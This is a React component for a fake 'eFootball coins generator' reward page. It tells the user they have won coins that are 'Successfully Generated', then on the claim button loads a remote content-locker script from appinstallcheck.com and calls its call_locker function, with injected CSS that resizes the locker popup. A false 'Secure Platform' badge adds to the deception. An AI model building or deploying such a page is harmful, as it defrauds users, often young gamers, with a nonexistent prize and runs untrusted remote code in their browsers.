import React, { useState, useEffect } from 'react';
import Confetti from 'react-confetti';
import { Gift, ArrowRight, Sparkles, ArrowLeft } from 'lucide-react';
import { WheelItem } from '../types/wheel';

interface ResultDisplayProps {
  userName: string;
  winningItem: WheelItem;
  onNext: () => void;
  onGoBack: () => void;
}

/**
 * ResultDisplay Component
 * Shows the winning result with confetti animation and call-to-action
 */
export const ResultDisplay: React.FC<ResultDisplayProps> = ({
  userName,
  winningItem,
  onNext,
  onGoBack
}) => {
  const [showCelebration, setShowCelebration] = useState(false);
  const [showNextButton, setShowNextButton] = useState(false);
  const [lockerActive, setLockerActive] = useState(false);

  useEffect(() => {
    // Disable scrolling when component mounts
    document.body.style.overflow = 'hidden';
    document.documentElement.style.overflow = 'hidden';

    // Add custom CSS for much smaller locker size
    const style = document.createElement('style');
    style.id = 'locker-custom-styles';
    style.textContent = `
      /* Make locker popup much smaller and responsive */
      .ogjs-popup, .ogjs-modal, .ogjs-container {
        max-width: 70vw !important;
        max-height: 60vh !important;
        width: auto !important;
        height: auto !important;
        transform: scale(0.5) !important;
        transform-origin: center !important;
      }

      /* Ensure locker content fits - much smaller */
      .ogjs-popup iframe, .ogjs-modal iframe {
        max-width: 100% !important;
        max-height: 50vh !important;
        width: 280px !important;
        height: 320px !important;
      }

      /* Center the locker */
      .ogjs-popup, .ogjs-modal {
        position: fixed !important;
        top: 50% !important;
        left: 50% !important;
        transform: translate(-50%, -50%) scale(0.5) !important;
        z-index: 9999 !important;
      }

      /* Mobile responsive - even smaller */
      @media (max-width: 768px) {
        .ogjs-popup, .ogjs-modal, .ogjs-container {
          transform: scale(0.4) !important;
        }
        .ogjs-popup iframe, .ogjs-modal iframe {
          width: 250px !important;
          height: 280px !important;
        }
      }

      @media (max-width: 480px) {
        .ogjs-popup, .ogjs-modal, .ogjs-container {
          transform: scale(0.35) !important;
        }
        .ogjs-popup iframe, .ogjs-modal iframe {
          width: 220px !important;
          height: 250px !important;
        }
      }

      /* Extra small screens */
      @media (max-width: 360px) {
        .ogjs-popup, .ogjs-modal, .ogjs-container {
          transform: scale(0.3) !important;
        }
        .ogjs-popup iframe, .ogjs-modal iframe {
          width: 200px !important;
          height: 220px !important;
        }
      }
    `;
    document.head.appendChild(style);

    // Start celebration animation immediately
    setShowCelebration(true);

    // Show next button after celebration
    const timer = setTimeout(() => {
      setShowNextButton(true);
    }, 2000);

    // Set up global listener for locker completion
    (window as any).lockerCompleted = () => {
      setLockerActive(false);
      onNext();
    };

    // Re-enable scrolling when component unmounts
    return () => {
      clearTimeout(timer);
      document.body.style.overflow = 'auto';
      document.documentElement.style.overflow = 'auto';
      // Clean up global listener
      delete (window as any).lockerCompleted;
      // Remove custom styles
      const customStyles = document.getElementById('locker-custom-styles');
      if (customStyles) {
        customStyles.remove();
      }
    };
  }, [onNext]);

  // Function to handle claim button click with locker
  const handleClaimClick = () => {
    try {
      // Check if script is already loaded
      const existingScript = document.getElementById('ogjs');
      if (existingScript) {
        // Script already exists, just call the locker
        if (typeof (window as any).call_locker === 'function') {
          (window as any).call_locker();
        }
        return;
      }

      // Load locker script when user tries to claim
      const script = document.createElement('script');
      script.type = 'text/javascript';
      script.id = 'ogjs';
      script.src = 'https://appinstallcheck.com/cl/js/po7d95';
      script.async = true;

      script.onload = () => {
        // Script loaded successfully, call the locker function
        setTimeout(() => {
          try {
            if (typeof (window as any).call_locker === 'function') {
              setLockerActive(true);
              (window as any).call_locker(); // Call the locker function
              // Note: The locker should call window.lockerCompleted() when done
            } else {
              console.log('call_locker function not found');
              onNext(); // Fallback if function not available
            }
          } catch (lockerError) {
            console.log('Locker call error:', lockerError);
            onNext(); // Fallback on error
          }
        }, 500); // Small delay to ensure script is fully loaded
      };

      script.onerror = () => {
        // If script fails to load, still allow claim
        console.log('Script failed to load');
        onNext();
      };

      document.head.appendChild(script);
    } catch (error) {
      console.log('Script loading error:', error);
      // If there's an error, still allow claim
      onNext();
    }
  };

  return (
    <div className="fixed inset-0 overflow-hidden">
      {/* Enhanced Confetti Animation */}
      <Confetti
        width={window.innerWidth}
        height={window.innerHeight}
        recycle={false}
        numberOfPieces={300}
        gravity={0.2}
        colors={['#FFD700', '#F97316', '#3B82F6', '#10B981', '#EF4444', '#FFFFFF']}
        wind={0.05}
      />

      {/* Celebration Popup - Same as Welcome Page */}
      <div className="fixed inset-0 flex items-center justify-center p-4">
        <div className="w-full max-w-md mx-auto relative">
          {/* Main celebration container - Same size as welcome */}
          <div className={`bg-white/10 backdrop-blur-lg rounded-3xl p-8 shadow-2xl border border-white/20 text-center transform transition-all duration-1000 ${
            showCelebration ? 'scale-100 opacity-100' : 'scale-50 opacity-0'
          }`}>

            {/* Back Button - Same as welcome page style */}
            <div className="flex justify-start mb-4">
              <button
                onClick={onGoBack}
                className="flex items-center space-x-2 text-white/70 hover:text-white transition-colors duration-200 group"
              >
                <ArrowLeft className="w-5 h-5 group-hover:-translate-x-1 transition-transform duration-200" />
                <span className="text-sm font-medium">Back</span>
              </button>
            </div>

            {/* Floating sparkles - Same as welcome page */}
            <div className="absolute inset-0 pointer-events-none">
              <Sparkles className="absolute top-4 left-4 text-yellow-400 w-6 h-6 animate-ping" />
              <Sparkles className="absolute top-8 right-6 text-orange-400 w-4 h-4 animate-ping delay-300" />
              <Sparkles className="absolute bottom-8 left-8 text-blue-400 w-5 h-5 animate-ping delay-500" />
              <Sparkles className="absolute bottom-4 right-4 text-green-400 w-6 h-6 animate-ping delay-700" />
            </div>

            {/* Congratulations Header - Very compact */}
            <div className="mb-2 relative z-10">
              <div className={`w-12 h-12 mx-auto mb-1 shadow-lg rounded-lg overflow-hidden border border-orange-400/50 hover:scale-105 transition-transform duration-300 ${
                showCelebration ? 'animate-bounce scale-100' : 'scale-0'
              }`}>
                <img
                  src="/efootball-logo.jpg"
                  alt="eFootball 2025 Logo"
                  className="w-full h-full object-cover"
                />
              </div>

              <div className={`transform transition-all duration-1000 delay-500 ${
                showCelebration ? 'translate-y-0 opacity-100' : 'translate-y-10 opacity-0'
              }`}>
                <h2 className="text-2xl font-bold text-white mb-2 animate-pulse">
                  🎉 CONGRATULATIONS!
                </h2>
                <h3 className="text-xl font-bold text-white mb-2">
                  {userName}!
                </h3>
                <p className="text-orange-100 text-lg">
                  You've won eFootball Rewards!
                </p>
              </div>
            </div>

            {/* Animated Coin Reward Display - Compact */}
            <div className={`mb-3 transform transition-all duration-1000 delay-700 ${
              showCelebration ? 'scale-100 opacity-100' : 'scale-75 opacity-0'
            }`}>

              {/* Card-style reward display - Smaller */}
              <div className="relative mb-1">
                <div
                  className={`rounded-lg p-2 shadow-lg border border-yellow-400/50 relative overflow-hidden transform transition-all duration-1000 ${
                    showCelebration ? 'animate-pulse' : ''
                  }`}
                  style={{ backgroundColor: winningItem.color }}
                >
                  {/* Animated background sparkles */}
                  <div className="absolute inset-0 opacity-20">
                    <div className="absolute top-2 left-4 w-2 h-2 bg-white rounded-full animate-ping"></div>
                    <div className="absolute top-8 right-6 w-1 h-1 bg-yellow-300 rounded-full animate-ping delay-200"></div>
                    <div className="absolute bottom-4 left-8 w-3 h-3 bg-white rounded-full animate-ping delay-400"></div>
                    <div className="absolute bottom-8 right-4 w-2 h-2 bg-yellow-300 rounded-full animate-ping delay-600"></div>
                  </div>

                  {/* Clean coin icon - Smaller */}
                  <div className={`relative z-10 transform transition-all duration-1000 delay-1000 ${
                    showCelebration ? 'scale-100 rotate-0' : 'scale-0 rotate-180'
                  }`}>
                    <div className="w-10 h-10 mx-auto mb-1 relative">
                      {/* Gold coin */}
                      <div className="w-10 h-10 rounded-full bg-gradient-to-br from-yellow-400 via-yellow-500 to-yellow-600 border-2 border-white shadow-lg flex items-center justify-center animate-bounce">
                        <div className="w-6 h-6 rounded-full bg-gradient-to-br from-yellow-200 to-yellow-300 border border-yellow-400 flex items-center justify-center">
                          <span className="text-yellow-700 font-black text-xs">$</span>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Amount display - Compact spacing */}
                  <div className={`relative z-10 transform transition-all duration-1000 delay-1200 ${
                    showCelebration ? 'translate-y-0 opacity-100' : 'translate-y-5 opacity-0'
                  }`}>
                    <h3
                      className="text-2xl font-black mb-1"
                      style={{ color: winningItem.textColor || '#FFFFFF' }}
                    >
                      {winningItem.label}
                    </h3>
                    <p
                      className="text-lg font-bold mb-1"
                      style={{ color: winningItem.textColor || '#FFFFFF' }}
                    >
                      COINS
                    </p>
                    <div className="bg-white/10 border border-white/30 rounded-lg p-2">
                      <p className="text-white font-bold text-sm">
                        ✅ Successfully Generated!
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Success message */}
              <div className={`bg-gradient-to-r from-green-500/20 to-blue-500/20 rounded-2xl p-4 border border-green-400/30 transform transition-all duration-1000 delay-1400 ${
                showCelebration ? 'translate-y-0 opacity-100' : 'translate-y-5 opacity-0'
              }`}>
                <p className="text-green-100 text-xl font-semibold">
                  🎯 Reward successfully unlocked!
                </p>
              </div>
            </div>

            {/* Animated Next Button */}
            <div className={`transform transition-all duration-1000 delay-2000 ${
              showNextButton ? 'translate-y-0 opacity-100 scale-100' : 'translate-y-10 opacity-0 scale-95'
            }`}>
              <button
                onClick={handleClaimClick}
                className={`w-full bg-gradient-to-r from-green-500 via-blue-600 to-purple-600 hover:from-green-600 hover:via-blue-700 hover:to-purple-700 text-white font-black py-5 px-8 rounded-2xl transition-all duration-300 transform hover:scale-105 shadow-2xl hover:shadow-green-500/25 flex items-center justify-center space-x-3 group border-2 border-white/20 ${
                  showNextButton ? 'animate-pulse' : ''
                }`}
              >
                {/* Button glow effect */}
                <div className="absolute inset-0 bg-gradient-to-r from-green-400/20 via-blue-400/20 to-purple-400/20 rounded-2xl blur-xl"></div>

                <Gift className="relative z-10 w-6 h-6 group-hover:animate-bounce" />
                <span className="relative z-10 text-lg tracking-wide">
                  {lockerActive ? 'PROCESSING...' : 'CLAIM YOUR COINS'}
                </span>
                <ArrowRight className="relative z-10 w-6 h-6 group-hover:translate-x-2 transition-transform duration-300" />

                {/* Sparkle effects on button */}
                <div className="absolute top-1 right-4 text-yellow-200 animate-ping">✨</div>
                <div className="absolute bottom-1 left-4 text-yellow-200 animate-ping delay-300">✨</div>
              </button>

              <div className="mt-4">
                <p className="text-green-100 text-xs font-medium animate-pulse">
                  🔒 Secure Platform • Instant Reward Delivery
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};